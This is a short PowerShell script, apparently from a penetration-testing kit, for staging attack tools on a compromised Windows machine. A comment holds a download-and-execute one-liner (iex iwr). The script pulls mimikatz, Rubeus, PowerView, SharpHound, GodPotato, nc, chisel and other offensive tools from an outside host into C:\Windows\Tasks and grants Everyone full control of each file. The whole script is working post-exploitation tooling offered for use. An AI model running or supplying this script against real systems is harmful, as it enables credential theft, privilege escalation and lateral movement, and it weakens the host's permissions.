# Downloads files from your machine in one swift go, rids permission issues if you move laterally
# iex(iwr -uri 192.168.45.163:8000/transfer_files.ps1 -usebasicparsing)

$baseUrl = "http://192.168.45.178:8000/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "Rubeus.exe", "SharpHound.ps1", "mimikatz.exe", "winpeas.exe", "PrintSpoofer64.exe", "PsLoggedOn.exe", "kerbrute.exe", "agent.exe", "Invoke-RunasCs.ps1", "GodPotato-NET2.exe", "nc.exe", "chisel.exe", "Seatbelt.exe", "jaws.ps1", "powercat.ps1", "PrivescCheck.ps1", "PowerUpSQL.ps1")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"

	# Set the file permission to Full control for Everyone
	icacls $filePath /grant Everyone:F
}
